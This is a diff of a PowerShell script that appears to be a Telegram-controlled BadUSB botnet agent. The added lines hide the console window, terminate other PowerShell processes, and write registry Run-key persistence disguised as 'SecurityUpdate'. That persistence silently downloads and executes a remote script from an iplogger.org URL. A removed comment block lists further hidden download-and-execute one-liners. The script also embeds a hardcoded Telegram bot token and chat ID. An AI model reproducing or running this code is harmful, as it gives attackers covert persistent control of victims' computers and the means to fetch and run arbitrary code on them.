@@ -1,36 +1,29 @@
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
+function Hide-Console {     
+$consolePtr = [Console.Window]::GetConsoleWindow()     
+#0 hide     
+[Console.Window]::ShowWindow($consolePtr, 0) 
+(Get-WmiObject Win32_Process -Filter "name = 'powershell.exe'" | where {$_.CommandLine -like '*-noni*'}).Terminate()
+} 
 
-<#  
-BADUSB COMMANDS:
-    # Execute 
-    powershell.exe -windowstyle hidden -file this_file.ps1
-    #Execute script from github
-    iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
-    PowerShell.exe -WindowStyle Hidden -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
-    PowerShell.exe -WindowStyle Minimized -Command iex ((New-Object System.Net.WebClient).DownloadString('https://iplogger.org/2jaZG6'))
-REGEDIT:
-	reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\SecurityUpdate.ps1"	
-    https://www.akadia.com/services/windows_registry.html 
-BOT TELEGRAM:
-    https://stackoverflow.com/questions/34457568/how-to-show-options-in-telegram-bot
-    powershell -windowstyle hidden -command iex ((New-Object System.Net.WebClient).DownloadString('https://iplogger.org/2jaZG6'))
-    PowerShell -windowstyle iex -command ((New-Object System.Net.WebClient).DownloadString('https://iplogger.org/2jaZG6'))
-	powershell.exe -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString('https://iplogger.org/2jaZG6')"
-
-    #>
+Hide-Console
 
 $BotToken = "1703588475:AAEyrNt2cuj-u6hWO8t3_NIbKLFVQyMDwNE"
 $ChatID = '928905258'
 $PersistPath = 'https://iplogger.org/2jaZG6'
-$DownArg ="powershell.exe -noni -nop -c " + "iex(New-Object System.Net.WebClient).DownloadString('https://iplogger.org/2jaZG6')"
 
 function Persist {
+  
         reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /f
+        reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate1 /f
         
-        #Send-Message "Downloading.."
         Invoke-WebRequest -Uri $persistPath -OutFile C:\ProgramData\SecurityUpdate.ps1
         
-		    reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\ProgramData\SecurityUpdate.ps1"
-        reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate1 /t REG_SZ /d $DownArg
+        reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate1 /t REG_SZ /d "powershell.exe -noni -W Hidden -nop -c iex (New-Object Net.WebClient).DownloadString('https://iplogger.org/2jaZG6')" 
 
 
         $checkPersist = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run | Select-String SecurityUpdate
@@ -207,7 +200,7 @@ Invoke-WebRequest `
     -Method Post `
     -ContentType "application/json;charset=utf-8" `
     -Body (ConvertTo-Json -Compress -InputObject $payload) `
-    -UserAgent Edge -UseBasicParsing
+    -UserAgent Edge -UseBasicParsing 
 
 
 ## WAIT FOR COMMAND ##
@@ -340,7 +333,7 @@ While ($DoNotExit)  {
 	    #The message sent is unknown
 		    #$Message = "Sorry $($LastMessage.Message.from.first_name), but I don't understand ""$($LastMessageText)""!"
 		    #$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html" -UserAgent Edge -UseBasicParsing
-        }
+        	}
 	  }
 	}
 }
